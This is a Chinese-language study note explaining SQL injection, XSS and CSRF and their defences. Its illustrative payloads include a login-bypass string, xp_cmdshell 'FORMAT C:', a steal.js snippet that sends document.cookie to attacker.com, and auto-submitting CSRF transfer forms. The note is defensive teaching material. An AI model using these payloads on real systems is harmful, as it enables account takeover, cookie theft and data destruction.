請說明 SQL Injection 的攻擊原理以及防範方法
---

### **SQL Injection（SQL 注入、SQLi） 攻擊原理：**
SQLi 為駭客常用的攻擊方式之一，其原理是由於程式有漏洞，沒有過濾使用者的輸入，因此攻擊者得以輸入惡意的字串（通常能改變 SQL 語法上的邏輯），令資料庫 (Database) 誤認為這些惡意字串是 SQL 指令的一部分而執行，從而取得資料庫的內容，並對內容（包含會員的帳號，密碼）進行竊取、假冒以及刪除等操作，。

![](https://i.imgur.com/p6k1tYt.jpg)
圖片來源： [SQL Injection 的多種攻擊方式與防護討論](https://www.qa-knowhow.com/?p=3186)


#### 舉例來說：

網站的會員登入時，需要輸入帳號與密碼, 而 PHP 等後端程式判定輸入的帳號、密碼比對資料庫的資料，來確定登入是否成功 ，PHP 執行的 SQL 語法如下:

> 從 Users 這個資料表中，取出符合 user_id 為 iamuser，且 password 為 newpassword 的會員資料。

```php=
select * from Users where user_id ='iamuser' and password ='newpassword';
```

**[ SQL Injection ]**

若是駭客輸入特殊字元
帳號： `' or 1=1 --`
密碼：任意值 (甚至不用輸入)

SQL 語法變成：
```php=
select * from Users where user_id ='' or 1=1 -- and password ='newpassword';
```
* 因為「`--`」在 MySQL 語法中代表註解的意思，所以「`--`」後面的字串會被認為是註解而不執行。
* where 後面剩下判斷 user_id 是否為空值，或者 1 是否等於 1，因為 `1 = 1 `永遠為 `true`，且 password 因被註解掉而可忽略，所以攻擊者成功登入此網站。
* SQL 語法的註解
「`/*`」 MySQL
「`--`」 MsSQL



### **SQL Injection 攻擊目的：**
攻擊者這麼做能幹嘛？對他們有什麼好處？
1. **偽裝目標身份**：取得資料庫伺服器管理權限，取得系統較高權限後，有可能得以在網頁加入惡意連結以及 XSS（例如 ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。
2. **修改現有資料**：例如取消交易、取出系統內的資料，破壞、覆蓋或刪除資料，甚至使其無法連線
3. **竄改網站以及公開儲存在資料庫內的個人識別資料、帳密和敏感公司資料**
4. **資料結構被駭客探知，得以做進一步攻擊**（例如 SELECT * FROM sys.tables）。
5. **經由資料庫伺服器提供的作業系統支援，讓駭客得以修改或控制作業系統**（例如 xp_cmdshell “net stop iisadmin” 可停止伺服器的 IIS 服務）。
6. **破壞硬碟資料，癱瘓全系統**（例如 xp_cmdshell “FORMAT C:”）。
7. **被攻擊者執行毀滅性的指令**： `Truncate tables`、`Drop tables`

### **如何防範 SQL Injection 攻擊：**

1. **跳脫參數 Escape Parameters**
SQLi 的原理為沒有過濾使用者的輸入，因此用正規化的方式驗證過濾的輸入值，將含有 SQL 指令過濾掉、或是將單引號變換成雙引號。

    缺點：
    * SQL 語法關鍵字一旦新增，檢查規則就要跟著改變
    * 總會有漏網之魚，無法全面防範

2. **參數化查詢 Query Parameterization**
參數化查詢的原理就是資料庫語法中的佔位符號。
例如：
    ```php=
    SELECT * FROM person WHERE name = $1 AND password = $2
    ```
    如此一來，即使使用者輸入的參數有不當的指令，丟進去的參數不會被當作 SQL 語法去執行！

    **[ PHP 的 Prepare Statement ]**

    * 把參數都改成問號 (?) 代替
    * bind_param() 的第一個參數，有幾個參數就要寫幾個，記得按照資料類型。
    * 字串 string => s
    * 數字 int => i

    ```php=
    <?php
    // 1.將 SQL 語法進行 prepare statement，並把參數都換為問號（?）
    $stmt = $conn->prepare("select * from Users where user_id= ? and password= ?"); 

    // 2.替換成想要的參數
    // bind_param('依序寫下參數的資料類型，有幾個？就寫幾個'，要換的第一個參數,要換的第二個參數,...,要換的第 n 個參數)
    $stmt->bind_param('ss', $username, $password); 

    // 3. 執行 query 語法 
    $stmt->execute(); 

    // 4. $result 為 query 的執行結果
    $result = $stmt->getResult();

    // 5. 如果 $result 的結果大於 0 筆
    // 則 $row 為從 $result 中取出的每筆資料
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc(); 
    }
    ?>
    ```
3. **白名單機制 White List** 
白名單的機制就是檢查使用者輸入的欄位一定只能是那些固定的值，例如使用者就只能輸入 lastname or firstname，也就是限制只能輸入的欄位名稱。


4. **其他**
* 將伺服器與資料庫部屬在不同的機器上，並保持更新狀態。
* 部屬 Web 應用程式防火牆，過濾掉 OSI 應用層的威脅，一般防火牆只會顧到網路層、傳輸層間的威脅，對於應用層較為忽略。
* 盡量不要取容易被猜取的資料庫、資料表名稱 (但有可能造成維護人員的不易)。
* 在不需要使用到更新、插入資料時，資料庫以 view 方式處理供使用者查詢資料。
* 將資料庫預設帳號、密碼關閉，提高資料庫存取權限





參考來源：
* [SQL 注入](https://developer.mozilla.org/zh-TW/docs/Glossary/SQL_Injection)@MDN
* [企業常遇到的四種網頁注入（Web Injection）攻擊](https://blog.trendmicro.com.tw/?p=57572)
* [[第十二週] 資訊安全 - 常見攻擊：XSS、SQL Injection
SQL Injection](https://yakimhsu.com/project/project_w12_Info_Security-XSS_SQL.html)
* [SQL Injection 常見的駭客攻擊方式](https://www.puritys.me/docs-blog/article-11-SQL-Injection-%E5%B8%B8%E8%A6%8B%E7%9A%84%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A%E6%96%B9%E5%BC%8F.html)
* [SQL Injection 的多種攻擊方式與防護討論](https://www.qa-knowhow.com/?p=3186)
* [一次看懂 SQL Injection 的攻擊原理](https://medium.com/%E7%A8%8B%E5%BC%8F%E7%8C%BF%E5%90%83%E9%A6%99%E8%95%89/%E6%B7%BA%E8%AB%87%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A-%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8-%E4%B8%80%E6%AC%A1%E7%9C%8B%E6%87%82-sql-injection-%E7%9A%84%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86-b1994fd2392a)
* [何謂資料隱碼 (SQL injection) 攻擊？程式設計師應如何預防？](https://job.achi.idv.tw/2011/09/11/what-is-a-sql-injection-sql-injection-attacks-program-designers-should-be-how-to-prevent-it/)
* [資安滲透攻防筆記 - 1](https://medium.com/@gordonfang_85054/%E8%B3%87%E5%AE%89%E6%BB%B2%E9%80%8F%E6%94%BB%E9%98%B2%E7%AD%86%E8%A8%98-1-c9a6b8ada5fa)
* [[Postx1] 攻擊行為－SQL 資料隱碼攻擊 SQL injection](https://ithelp.ithome.com.tw/articles/10189201)
* [SQL injection 原理介紹與防範教學 - 工程師絕不能犯的低級錯誤！](https://blog.kennycoder.io/2020/01/09/SQL-injection-%E5%8E%9F%E7%90%86%E4%BB%8B%E7%B4%B9%E8%88%87%E9%98%B2%E7%AF%84%E6%95%99%E5%AD%B8-%E5%B7%A5%E7%A8%8B%E5%B8%AB%E7%B5%95%E4%B8%8D%E8%83%BD%E7%8A%AF%E7%9A%84%E4%BD%8E%E7%B4%9A%E9%8C%AF%E8%AA%A4/)
* [Sql injection 幼幼班](https://www.slideshare.net/hugolu/sql-injection-61608454)


請說明 XSS 的攻擊原理以及防範方法
---


### **Cross-site scripting（XSS）跨網站腳本** 
為了與 CSS (Cascading Style Sheets)  區別，第一個字改為 X，簡稱 XSS

### **XSS 攻擊原理：**

攻擊者首先在網站內可以輸入內容的地方（例如：留言版、訊息、搜尋欄或網址列...等），輸入一段特殊的代碼（大多為 HTML 或 Javascript 語法），然後神奇的是，這段惡意代碼由於沒有經過校驗與過濾，所以瀏覽器無法識別與網站正常的程式有什麼差別，導致惡意代碼成為程式的一部分被執行。

> 舉個例子來說，如果沒有嚴格的監督與可靠的識別機制，民眾無法分別萊克多巴胺豬跟本土豬有什麼樣的區別時，結果就是：一律被當作本土豬吃下肚。

一旦受到了 XSS 攻擊，日後任何的使用者在造訪這個網站時，則會載入這段惡意的腳本，攻擊者便可利用這些惡意腳本，修改網站的內容或竊取使用者的隱私資料。

### **XSS 攻擊目的：**

攻擊者這麼做能幹嘛？對他們有什麼好處？
1. **改頁面**：修改網站頁面的呈現--> 可用  `.html() `或 `.innerHTML()`等語法或者直接放 JS 語法
2. **轉址**： 網頁被置換或者將使用者從正在訪問的頁面導入到釣魚網站，劫持流量 --> `location.href=" "`
3. **盜用使用者賬戶進行轉賬、發訊息**
4. **偷資料**：將使用者的隱私資料如 cookie / Session ID 發送給攻擊者，獲得使用者登錄狀態 -->`<script type="text/javascript">alert(document.cookie)</script>`
5. **利用使用者發起 [DDOS 攻擊](https://www.cloudflare.com/zh-tw/learning/ddos/what-is-a-ddos-attack/)**



### **XSS 攻擊主要分為三種類型：**
1. **反射型 XSS (Reflected)**
 又稱為非持久型 XSS 攻擊，攻擊者發現網站有 URL 的漏洞，於是建構了一段特殊的 URL，當使用者點開這個惡意的 URL 連接後，使用者的瀏覽器就會執行這段 URL 請求，混在裡面惡意程式也會被執行，從而執行攻擊者指定的操作。
 例如，當被害人點擊該 URL 時，就會看到且執行該 JavaScript
`http://www.mysite.com/?example=<script>alert('You have been attacked')</script>`

    另一個例子:
    
    ```
    // input 輸入欄位
    <input type="text" placeholder="請輸入內容" />  

    // 攻擊者在欄位中輸入以下程式，當程式執行時，會執行steal.js
    <script type="text/javascript" src="http://www.attacker.com/steal.js"></script>

    steal.js
    // 攻擊者在遠端的 steal.js 程式，利用 <img> 標籤不受同源政策的限制拿到使用者的 cookie
    const img = document.creatElement("img");
    img.src = "http://www.attacker.com/log?" + escape(document.cookie);
    document.body.appendChild(img);
    ```

2. **儲存型 XSS (Stored)**
也稱為持久型 XSS，因為能將 XSS 的惡意語法儲存在網站的資料庫中。

    常見的例子是攻擊者將惡意的 XSS 語法留在留言板、評論...等，點擊送出後由於沒有經過嚴格的限制與篩選，直接存在資料庫中，這樣一來，之後每個使用者在瀏覽這個留言板時，就會因執行了被插入的XSS 語法而受害
    舉例來說：
    ```
    <input type="text" placeholder="請輸入內容" />  // input 輸入欄位
    
    // 攻擊者輸入惡意的 <script> 標籤內容，讓網站出現彈窗
    <script>alert("這個網站有 XSS 漏洞");</script>  
    
    // 攻擊者輸入惡意的 <meta> 標籤，讓網站一直持續刷新
    <meta http-equiv="refresh" content="0">  
    ```

3. **DOM 型 (DOM-Based)**
DOM 型的攻擊是透過惡意的程式碼來修改頁面的 DOM 結構，程式碼的取出和執行都在瀏覽器端完成，屬於前端 Javascript 程式碼中的自身安全漏洞，因此必須在客戶端（client side）就做防護與檢查，而反射型 XSS 跟儲存型 XSS 則是需在伺服器端（Server side）做防護與驗證。

### **如何防範 XSS 攻擊：**

如果說美劇[豪斯醫生（Dr.House）](https://zh.wikipedia.org/wiki/%E8%B1%AA%E6%96%AF%E5%8C%BB%E7%94%9F)的信念是 "patient lies"
那麼套用在資安領域就是："**絕對不要相信來自 client 端的資料**，never and forever !!! "

![](https://i.imgur.com/fUOLV2s.png)
圖片來源：[pinterest](https://www.pinterest.com/pin/548735535847108009/)



#### 防禦原則：驗證使用者輸入的資訊: 对客戶端（client side）提交的各種字符與數據做過濾與驗證



因為 XSS 有太多漏洞可以鑽： HTML、JavaScript、CSS、XML、URL、Java、VBScript、ActiveX、Flash...，只要能夠在客戶端運行的部分，都可能受到 XSS 攻擊，因此要很完整對輸入做防範非常困難。

只要是不信任的 input ，在「輸入之前」跟「輸出之前」都要以 encode 的方式呈現幫它做個濾鏡再呈現到瀏覽器上，尤其是輸出前，不要赤裸的讓所有 input 直接執行，這樣比較安全又不會傷眼睛 XD

### 驗證
1. **格式驗證**：檢查 input 是否為預期輸入的格式，例如長度大小是否超過限制，姓名欄位是否為中文等。
2. **对特定字符進行編碼**
* HTML encode，將 HTML 中的特殊符號，例如` < > `符號編碼取代。
* 對 `<script>` 這類標籤，以及 `HTML Body `和 `attribute` 內的 HTML Entities 都進行編碼
* 輸出為 URL 參數前；進行 URL encode 
* 用 escape 跳脫
    * 讓輸入的內容為文字，不為程式或標籤： 
    ```
    //  PHP escape 程式
    htmlspecialchars('',ENT_QUOTES)
* 輸出時記得要 encoding
    ```
    & --> &amp;
    < --> &lt;
    > --> &gt;
    " --> &quot;
    ' --> &#x27;     
    / --> &#x2F;
    ```
* 在使用 `.innerHTML`、`.outerHTML`、`document.write()` 盡量改用` .textContent`、`.setAttribute()` 等。
  例如：  `document.querySelector('#newContent').textContent = userInput`
  
* URL 添加內容是，使用` window.encodeURIComponent ()`
    ```
    window.location.href = window.location.href + '?test=' + window.encodeURIComponent(theUserGeneratedInput)
    ```

### 過濾
1. **設定黑名單、白名單過濾**：黑名單能決定不允許出現哪些標記，白名單則是允許哪些標記。但設定黑名單容易出錯、有很多變形可以替換，複雜度高且對未來無保障，白名單策略則是比較推薦的方式。
2. **設定 cookie 屬性**： 
* `secure`： 為 true 時，Cookie 只能在安全的協議下傳輸，通常為 HTTPS。
* `httpOnly`： 為 true 時，不允許 Javascript 程式碼，如 document.cookie 去更改 cookie，避免受到 xss 攻擊拿到 cookie。

3. **對於不確定安全的來源**：不用 [eval()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval) 的方法，對於 JSON 的解析，使用 `JSON.parse ()`。
4.  [**Content-Security-Policy（CSP）内容安全策略**](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)。
在 Header 中傳送 CSP，來告訴瀏覽器什麼是被授權執行的安全和受信任的 Javascipt 程式碼，與什麼是需要被禁止的。
    ```
    // 在 HTTP Header 中使用

    Content-Security-Policy: policy
    * Content-Security-Policy: default-src 'self'  // 限制所有的外部資源，都只能從當前域名載入
    ```

參考來源：
* [excess-xss](https://excess-xss.com/)
* [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/#Stored_and_Reflected_XSS_Attacks)
* [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
* [Cross-site Scripting](https://www.cloudflare.com/zh-tw/learning/security/threats/cross-site-scripting/)@ CloudFlare
* [Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [JavaScript Security Issues and Best Practices](https://blog.bitsrc.io/javascript-security-issues-and-best-practices-37e78df4dce4)
* [XSS 攻擊的深入探討與防護之道
](https://www.qa-knowhow.com/?p=2992)
* [駭客如何用 XSS 讀取 Cookie?](https://www.qa-knowhow.com/?p=2951)
* [XSS 攻击的原理及防范](https://blog.oonne.com/site/blog?id=62)
* [XSS 攻击原理、示例和防范措施](https://www.cnblogs.com/xiaxiaoxu/p/10424782.html)
* [前端安全系列（一）：如何防止 XSS 攻击？](https://juejin.im/post/6844903685122703367#heading-1)
* [WEB 網站防禦 XSS 攻擊思路和 XSS 實踐](https://www.itread01.com/content/1549689506.html)
* [前端 | XSS 的攻击手段及其防御](https://zhuanlan.zhihu.com/p/61773197)
* [【網頁安全】給網頁開發新人的 XSS 攻擊 介紹與防範](https://forum.gamer.com.tw/Co.php?bsn=60292&sn=11267)
* [详解 XSS 和 CSRF 简述及预防措施](http://www.cppcns.com/wangluo/safe/254101.html)
* [[第十二週] 資訊安全 - 常見攻擊：XSS、SQL Injection](https://yakimhsu.com/project/project_w12_Info_Security-XSS_SQL.html)
* [XSS 攻击类型解释与预防](https://www.pipipi.net/3227.html)
* [跨站腳本攻擊(Cross-Site Scripting, XSS)概述](https://www.gss.com.tw/images/stories/epaper_GSS_security/pdf/epaper_gss_security_0067.pdf)
* [Web 安全防范 (XSS、CSRF)](https://segmentfault.com/a/1190000013022789?utm_source=sf-related)
* [web 前端攻击技术与防范 ——XSS、CSRF、网络劫持、控制台注入、钓鱼](https://segmentfault.com/a/1190000012496422?utm_source=sf-related)
* [SQL injection 的簡介與預防](https://sites.google.com/site/chengshixuexipingtai/sql/ql-injection-de-jian-jie-yu-yu-fang)
* [給網頁開發新人的 XSS 攻擊 介紹與防範](https://forum.gamer.com.tw/Co.php?bsn=60292&sn=11267)
* [[IS] Cross-Site Scripting(XSS)](https://pjchender.github.io/2020/06/30/is-cross-site-scripting-xss/)
* [資安這條路 10 - [跨站腳本漏洞] Store XSS , Relate XSS , DOM XSS](https://ithelp.ithome.com.tw/articles/10243967)
* [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
[内容安全策略 (CSP)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP) @MDN
[Content-Security-Policy - HTTP Headers 的資安議題 (2)](https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/)
[內容安全策略（CSP）詳解](https://www.itread01.com/content/1550574731.html)
[HTTP 安全從「頭」開始](https://www.ithome.com.tw/voice/130302)
[Content Security Policy (CSP) 筆記](https://hackmd.io/@Eotones/BkOX6u5kX)

請說明 CSRF 的攻擊原理以及防範方法
---
### CSRF （Cross-Site Request Forgery）跨站請求偽造
也被稱為 one click attack 或者 session riding。

### **CSRF 攻擊原理：**

使用者在正常流程下登入了 A 網站，取得 A 網站伺服器身份確認的信任 (例如： cookies)，接下來的一段時間內你在 A 網站的所有操作都不需要重複驗證身份，若在 cookie 尚未過期期間（代表可為登入狀態），使用者不巧的瀏覽到攻擊者架設的「惡意 B 網站」，在使用者毫不知情的情況下，僅僅開啟 B 網站(有嵌入隱藏圖片或隱藏表單)或者引誘使用者點擊 B 網站的某個按鈕，攻擊者就可以借助使用者的名義偽造請求到 A 網站（通常是帶上使用者的 cookies），若 A 網站的伺服器驗證機制不足，則可能認為這個請求時來自使用者本人。

![](https://i.imgur.com/d6NvpBW.jpg)

圖片來源：[CSRF 攻擊防禦原理](https://www.chainnews.com/zh-hant/articles/351048044261.htm)

> 舉例來說：小明的微 x 百貨 VIP 會員聯名信用卡，在某天逛菜市場的途中毫不知情地被偷走了，於是拿到小明 VIP 會員聯名信用卡的小偷雀躍不已，開始瘋狂的盜刷，買了滿山滿海的奢侈品，由於商家們沒有嚴格的身份審核，只認卡不認人，所以誤相信使用這張卡的還是小明本人。

### 常見的 CSRF 攻擊類型
1. **GET 方式的 CSRF 攻擊**
這類攻擊通常使用 `<img>` 或 `<a>`標籤，發送 HTTP 請求：
      ```php=
     <img src="http://a.com/withdraw?money=10000&for=attacker" width='0' height='0' / > 
      ```
      當使用者瀏覽含有上面的 `<img>` 的頁面，瀏覽器自動對 a.com 網站發送 HTTP 請求。此時，若使用者在 a.com 的 cookie 尚未過期， 瀏覽器就會連同使用者在 cookie 一起帶上去。 


2. **POST 方式的 CSRF 攻擊**
利用自動提交的表單發送 POST 請求
    ```html=
     <form action="http://a.bank.com/withdraw" method=POST>
        <input type="hidden" name="account" value="victim" />
        <input type="hidden" name="amount" value="10000" />
        <input type="hidden" name="for" value="attacker" />
    </form>
    <script> document.forms[0].submit(); </script>
    ``` 
    當使用者訪問此網站的頁面時，表單會自動提交。


3.  **鏈接式的 CSRF 攻擊**
用吸引人的話語，誘導使用者點擊鏈接。
    ```php=
    <a href='https://a.blog.com/delete?articleId=3' taget="_blank" >抽大獎！</a >
    ```
    以刪除某個文章為例，a.blog.com 網站單純使用了 /delete?articleId=3 的 GET 請求即可刪除特定文章，且實際刪除文章前，沒有再做確認，攻擊者想辦法讓使用者點擊上述鏈接，使用者就會在不知情的情況下，刪除了某篇文章。


### **XSS (cross-site scripting) 與 CSRF 不同之處：**

* XSS 是攻擊者在網站上輸入惡意程式碼來進行攻擊，利用的是「使用者本身對目標網站」的信任
* CSRF 則是利用的是「目標網站的伺服器對使用者網頁瀏覽器」的信任，發送惡意請求的攻擊

### **CSRF 攻擊目的：**
攻擊者這麼做能幹嘛？對他們有什麼好處？
1. **盜用使用者的身份**：假裝是使用者發送惡意請求。(包括：發送 email、發送訊息、盜用賬號、購買商品、修改帳號密碼、轉帳給攻擊者)

### **如何防範 CSRF 攻擊：**
CSRF 攻擊是單純信任瀏覽器，忽略了要對使用者進行身分確認機制的結果

1. **使用者方面：**

* 登錄網站後，使用完記得要登出。
* 登錄網站期間，避免瀏覽其他網站或圖片，表單及文字等連結點擊。(這個有點難度，通常我瀏覽器的 tab 都是開好開滿 XD)
* 避免瀏覽其他不明來歷網站或點擊不明來歷圖片，表單及文字等連結。
* 避免在瀏覽器儲存帳户名稱或密碼
* 使用者須是在登入狀態下，CSRF 攻擊才有可能成立，任何網站都盡量不要自動登入，若使用者在這個網站沒有活動一段時間，則自動登出，讓session 週期失效


2. **開發人員方面：**
CSRF 攻擊的特點：通常从第三方網站發出請求，攻擊者可以不需知道 Cookie 等訊息。因此，防禦策略可從這兩點下手：
    > 擋掉別的 domain 發送的 request 請求
    > 提交 request 請求時附加只用使用者才有的信息
    1. **擋掉別的 domain 發送的 request**
    * 檢查 Referer
        * 檢查 request 的 header 中 referer 欄位 ，若不是合法的 domain，二話不說，直接擋掉
        * 缺點： 有些瀏覽器不一定帶 referer，且使用者有可能會關閉 referer、或 url 有很多變形方法，容易遺漏或規避，甚至偽造
    * Samesite Cookie
        * 屬於在瀏覽器方面加強驗證機制
        * 透過在 Cookie 中加入 SameSite，當有跨站請求時，就不會送上 Cookie
`Set-Cookie: session_id=ewfewjf23o1; SameSite`
        * SameSite 的兩種模式：
            * Stric：只允許 same site，無法跨站送出 cookie
            * Lax：SameSite 默認， `<a>`, `<link rel="prerender">`, `<form method="GET">` 會帶上 cookie。但是 POST, PUT, DELETE 方法的 form，不會帶上 cookie，且沒辦法擋掉 GET 形式的 CSRF
    2. **提交請求時附加只用使用者才有的信息**
     * CSRF Token
        * 網站的伺服器提供使用者一組唯一且隨機的序號，並在一定時間內刷新。確保某些資訊「只有使用者知道」，但攻擊者不知道也拿不到，這個隨機序號稱為 CSRF Token。
        * 在訪問這個網站時，除攜帶 cookie，還需要連同附上這個 CSRF Token，否則網站將拒絕這次的請求。
        * 在 form 增加一個 hidden 的欄位，叫做 csrftoken，這裡面填的值由 server 隨機產生，並且存在 server 的 session 中。
        ``` html=
        <form action="https://a.blog.com/delete" method="POST">
          <input type="hidden" name="id" value="3"/>
          <input type="hidden" name="csrftoken" value="fj1iro2jro12ijoi1"/>
          <input type="submit" value="刪除文章"/>
        </form>
        ```
        * submit 提交後，網站伺服器將 csrftoken 對比 session 所存的是否相同以及時間戳，若結果一致且未過期，則代表是由使用者本人發出的請求。 
    * Double Submit Cookie
        * 利用瀏覽器無法跨 domain 設定 cookie 的限制，將 csrf token 同時存在瀏覽器的 cookie 中
        ``` html=
        Set-Cookie: csrftoken=fj1iro2jro12ijoi1

        <form action="https://a.blog.com/delete" method="POST">
          <input type="hidden" name="id" value="3"/>
          <input type="hidden" name="csrftoken" value="fj1iro2jro12ijoi1"/>
          <input type="submit" value="刪除文章"/>
        </form>
        ```
        * 攻擊者可以 form 裡面偽造 csrftoken，但受到瀏覽器的限制，攻擊者無法在自己的 domain 設定 a.blog.com 的 cookie。所以可透過驗證 cookie 與 from 中的 csrftoken 是否一致判斷是否為使用者本人。
        
    3. **確認使用者身份（加上圖形驗證碼、簡訊驗證碼）**
        * 確認身份須有其他驗證方式，例如：再次輸入密碼（最好是與登入密碼不同或透過手機訊息傳送的一次性密碼）、發送電子郵件附上驗證鏈結。
        * 許多網路銀行轉帳時都會再多一道程序要求使用者輸入簡訊的驗證碼，由於攻擊者不會知道簡訊的驗證碼，所以可以確保不會受到 CSRF 攻擊。

參考來源：
* [CSRF](https://developer.mozilla.org/zh-TW/docs/Glossary/CSRF)@MDN
* [讓我們來談談 CSRF](https://blog.techbridge.cc/2017/02/25/csrf-introduction/)
* [[第十二週] 資訊安全 - 常見攻擊：CSRF](https://yakimhsu.com/project/project_w12_Info_Security-CSRF.html)
* [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* [跨站請求偽造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
* [CSRF 攻擊是什麼？ 簡述](https://bigboys-me.medium.com/%E7%B0%A1%E8%BF%B0-csrf-%E6%94%BB%E6%93%8A%E6%98%AF%E4%BB%80%E9%BA%BC-78bb95d8ca7d)
* [CSRF 攻擊原理](https://medium.com/@Tommmmm/csrf-%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86-d0f2a51810ca)
* [從防禦認識 CSRF](https://www.ithome.com.tw/voice/115822)
* [跨站偽造請求（Cross site request forgery, CSRF）是什麼？](https://pjchender.github.io/2020/05/25/%E8%B7%A8%E7%AB%99%E5%81%BD%E9%80%A0%E8%AB%8B%E6%B1%82%EF%BC%88cross-site-request-forgery-csrf%EF%BC%89%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F/)
* [前端安全系列之二：如何防止 CSRF 攻击？](https://juejin.im/post/6844903689702866952)
* [前端 | CSRF 的攻击类型与防御](https://zhuanlan.zhihu.com/p/61827277)
* [前端安全系列 | CSRF](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/699621/)
* [CSRF - A Sleeping giant in the world of web security](https://medium.com/@ashifm4/protection-from-cross-site-request-forgery-csrf-9cf4f542e268)
* [Cross-Site Request Forgeries](https://shiflett.org/articles/cross-site-request-forgeries)
* [浅析 CSRF 的防御和攻击案例](https://www.anquanke.com/post/id/204052)
* [浅谈 CSRF 攻击方式](https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
* [Cross Site Request Forgery](https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf)@ Rails Guides
* [資安補漏洞，越補越大洞](https://ithelp.ithome.com.tw/users/20107304/ironman/2006?page=1)@ iT 邦幫忙
* [[技術分享] Cross-site Request Forgery (Part 1)](https://cyrilwang.pixnet.net/blog/post/31813568)
* [[技術分享] Cross-site Request Forgery (Part 2)](https://cyrilwang.pixnet.net/blog/post/31813672)